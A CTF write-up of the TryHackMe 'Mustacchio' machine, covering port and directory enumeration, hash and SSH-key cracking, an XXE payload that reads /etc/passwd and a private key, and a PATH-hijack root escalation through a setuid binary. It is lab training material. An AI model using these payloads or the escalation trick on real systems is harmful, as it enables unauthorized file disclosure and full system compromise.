---
title: "Mustacchio"
date: 2025-01-22
image: /assets/img/tryhackme/Mustacchio/Mustacchio_image.jpg
description: Writeup of the TryHackMe-CTF Mustacchio
categories: [Tryhackme, Easy]
tags: [linux, enumeration, revshell, web, privesc, xxe]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Plattform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Mustacchio</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Easy boot2root Machine</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/r/room/mustacchio">https://tryhackme.com/r/room/mustacchio</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Mustacchio.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.114.250
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 05:42 EST
Nmap scan report for 10.10.114.250
Host is up (0.037s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8765/tcp open  ultraseek-http

Nmap done: 1 IP address (1 host up) scanned in 118.78 seconds
```
and enumerated the services nmap found in more depth using the `-A` flag:
```bash
$ nmap -A -p 22,80,8765 10.10.114.250
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 05:45 EST
Nmap scan report for 10.10.114.250
Host is up (0.036s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Mustacchio | Home
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry
|_/
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.56 seconds
```
from here I analyzed the services one after another.

## HTTP Analysis
As we can see in the nmap output there is a robots.txt file, but didn't reveal anything useful. Therfore I started a `gobuster` directory enumeration:
```bash
$ gobuster dir --url http://10.10.114.250/ --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,php,bak,txt,sh
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.114.250/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,bak,txt,sh
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 1752]
/images               (Status: 301) [Size: 315] [--> http://10.10.114.250/images/]
/contact.html         (Status: 200) [Size: 1450]
/about.html           (Status: 200) [Size: 3152]
/blog.html            (Status: 200) [Size: 3172]
/gallery.html         (Status: 200) [Size: 1950]
/custom               (Status: 301) [Size: 315] [--> http://10.10.114.250/custom/]
/robots.txt           (Status: 200) [Size: 28]
/fonts                (Status: 301) [Size: 314] [--> http://10.10.114.250/fonts/]
```
While gobuster was running I performed some manual enumeration but didn't found anything interesting. Therefore I waited for the scan and started analyzing the results.
### /custom directory

The directoy had file browsing available so I found the file `/custom/js/user.bak`. I downloaded it and see what we get from it:
```bash
$ file user.bak
users.bak: SQLite 3.x database, last written using SQLite version 3034001, file counter 2, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 2
```
With `SQLiteBrowser` I was able to check the entries in the database. I found just one table called `users` with one entry. The entry provided the username admin and a hash value. I tried to get more information about this hash value:
```bash
$ hashid 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
Analyzing '1868e36a6d2b17d4c2745f1659433a54d4bc5f4b'
[+] SHA-1
[+] Double SHA-1
[+] RIPEMD-160
[+] Haval-160
[+] Tiger-160
[+] HAS-160
[+] LinkedIn
[+] Skein-256(160)
[+] Skein-512(160)
```
SHA1 hashes can be found in the <a href="https://crackstation.net/">CrackStation</a> database, so I gave it try: 
![CrackStaion result](/assets/img/tryhackme/Mustacchio/thm_mustacchio_1.jpg){: width="1014" height="86"}

The other directories didn't provide anything useful so I moved on.

## Port 8765 Analysis
The server provided another website with a login form under port 8765. 
![Admin Login](/assets/img/tryhackme/Mustacchio/thm_mustacchio_2.jpg){: width="332" height="350"}

I tried the credentials for the user admin I got in the previous step and was able to login. Always start with source code analysis, which reveal me the following comment:
```html
<!-- Barry, you can now SSH in using your key!-->
```

The website had a textfeld and a headline which said `"Add a comment on the website."`. After some tests I got the following error message:

![XML Comment Textfield](/assets/img/tryhackme/Mustacchio/thm_mustacchio_3.jpg){: width="581" height="493"}

XML always sounds like XXE so I tried the following payload...
```text
<!DOCTYPE people[
   <!ENTITY thmFile SYSTEM "file:///etc/passwd">
]>
<people>
   <name>&thmFile;</name>
   <author></author>
   <comment>glitch@wareville.com</comment>
</people>
```
... and had success:

![XML Comment Textfield](/assets/img/tryhackme/Mustacchio/thm_mustacchio_4.jpg){: width="2578" height="787"}

With the comment about Barry's ssh key could be found somewhere I tried to look for it:

![XML Comment Textfield](/assets/img/tryhackme/Mustacchio/thm_mustacchio_5.jpg){: width="2578" height="787"}

That must be Barry's ssh key so I downloaded it and prepared it to use it. First extract the hash using `ssh2john` to crack the password we need for the connection:
```bash
$ ssh2john id_rsa > hashes
$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[removed]       (id_rsa)
1g 0:00:00:00 DONE (2025-01-22 05:58) 2.127g/s 6320Kp/s 6320Kc/s 6320KC/s urieljr.k..urielandrea
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Now where I had the password I was able to connect via ssh and read the user flag:

```bash
$ chmod 600 id_rsa
$ ssh -i id_rsa barry@10.10.114.250
barry@mustacchio:~$ hostname
mustacchio
barry@mustacchio:~$ cat user.txt
[*** removed ***]
```
## Privilege Esclation
While searching a way to escalate my privileges I found an intersting binary:
```bash
barry@mustacchio:/home/joe$ ls
live_log
barry@mustacchio:/home/joe$ file live_log
live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a45518964ad12abe, for GNU/Linux 3.2.0, not stripped
```

The file `live_log` just prints out the current webserver `access.log`. With the commandline utility `strings` I was able to get more insights:
```bash
barry@mustacchio:/home/joe$ strings live_log
[*** removed for readability ***]
Live Nginx Log Reader
tail -f /var/log/nginx/access.log
[*** removed for readability ***]
```
Intersting is that `tail` didn't use an absolute path what we can missuse. I created a file called `tail` in barrys home directory (`/home/barry`) and inserted the following code:
```python
!/usr/bin/python3
import pty
pty.spawn("/bin/bash")
```
Making the new `tail` an executable, modify our path variable and finally execute the `live_log` gave me root access: 

```bash
barry@mustacchio:~$ chmod +x tail
barry@mustacchio:~$ export PATH=$PWD:$PATH
barry@mustacchio:~$ ../joe/live_log
root@mustacchio:~# whoami
root
root@mustacchio:~# cd /root
root@mustacchio:/root# cat root.txt
[*** removed ***]
```

solved! :)
